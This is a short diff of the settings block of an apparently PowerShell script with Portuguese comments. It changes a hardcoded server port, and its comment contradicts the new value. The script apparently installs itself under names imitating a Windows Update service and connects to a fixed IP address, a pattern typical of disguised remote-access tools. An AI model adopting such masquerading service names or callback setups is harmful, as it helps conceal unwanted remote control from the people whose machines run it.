@@ -11,7 +11,7 @@
 # CONFIGURAÇÕES
 # ══════════════════════════════════════════════════════════════════════════════
 $serverIP = "198.1.195.194"
-$serverPort = 3000  # ✅ Alterado de 5000 para 3000
+$serverPort = 4000  # ✅ Alterado de 5000 para 3000
 $installName = "WinUpdateSvc"
 $autoName = "GlobalMicrosoftWindowsUpdateService"
 
